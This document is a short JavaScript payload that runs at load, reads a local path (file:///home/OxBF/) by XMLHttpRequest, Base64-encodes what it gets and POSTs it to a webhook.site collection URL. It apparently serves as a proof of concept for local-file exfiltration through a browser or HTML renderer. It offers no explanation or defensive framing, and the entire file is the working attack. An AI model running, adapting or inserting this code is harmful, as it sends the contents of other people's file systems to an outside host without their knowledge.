
// Function to handle the conversion and transmission of data
function sendData(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://webhook.site/2b8bb9a9-47c9-4205-a5f9-beea46868d97", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("data=" + encodeURIComponent(data));
}

// Function to fetch and process the local file
function fetchAndProcess() {
    var x = new XMLHttpRequest();
    x.open("GET", "file:///home/OxBF/", false);
    x.onload = function() {
        // Check if the request was successful
        if (true) {
            // Convert the responseText to Base64
            try {
                var base64Encoded = btoa(unescape(encodeURIComponent(x.responseText)));
                // Send the Base64-encoded data to your server
                sendData(base64Encoded);
            } catch (e) {
                console.error("Error encoding response: ", e);
            }
        } else {
            console.error("Request failed: ", x.status);
        }
    };
    x.onerror = function() {
        console.error("Error fetching the file.");
    };
    x.send();
}

// Execute the fetch and process function
fetchAndProcess();
